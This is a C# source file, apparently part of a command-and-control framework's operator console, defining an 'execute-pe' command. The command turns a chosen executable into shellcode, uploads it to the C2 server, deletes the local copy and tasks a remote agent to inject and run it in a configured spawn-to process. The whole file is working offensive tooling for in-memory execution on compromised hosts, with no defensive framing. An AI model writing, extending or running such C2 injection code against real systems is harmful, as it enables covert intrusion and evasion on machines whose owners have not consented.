using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common;
using Common.Payload;

namespace Commander.Commands.Agent.Execute
{

    public class ExecutePECommand : SimpleEndPointCommand
    {
        public override string Description => "Execute a PE assembly in memory";
        public override string Name => "execute-pe";

        protected override void InnerExecute(CommandContext context)
        {
            var agent = context.Executor.CurrentAgent;

            var args = context.CommandParameters.GetArgs();
            if(args.Length == 0)
            {
                context.Terminal.WriteLine($"Usage : {this.Name} ExePath [Arguments]");
                return;
            }

            var exePath = args[0];

            if (!File.Exists(exePath))
            {
                context.Terminal.WriteError($"File {exePath} not found");
                return;
            }
           
            



            string binFileName = string.Empty;


            var prms = context.CommandParameters.ExtractAfterParam(0);
            context.Terminal.WriteLine($"Generating payload with params {prms}...");

            var generator = new PayloadGenerator(context.Config.PayloadConfig, context.Config.SpawnConfig);
            binFileName = Path.Combine(context.Config.PayloadConfig.WorkingFolder, ShortGuid.NewGuid() + ".bin");
            var result = generator.GenerateBin(exePath, binFileName, agent.Metadata.Architecture == "x86", prms);
            //if (context.Options.verbose)
            //    context.Terminal.WriteLine(result.Out);
          

            context.Terminal.WriteLine($"Pushing {binFileName} to the server...");
            byte[] fileBytes = null;

            using (FileStream fs = File.OpenRead(binFileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            string fileName = Path.GetFileName(exePath);
            var fileId = context.UploadAndDisplay(fileBytes, Path.GetFileName(fileName)).Result;

            
            File.Delete(binFileName);
            string process = agent.Metadata.Architecture == "x86" ? context.Config.SpawnConfig.SpawnToX86 : context.Config.SpawnConfig.SpawnToX64;

            context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn-wait", fileId, fileName, process).Wait();
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
        }
    }
}
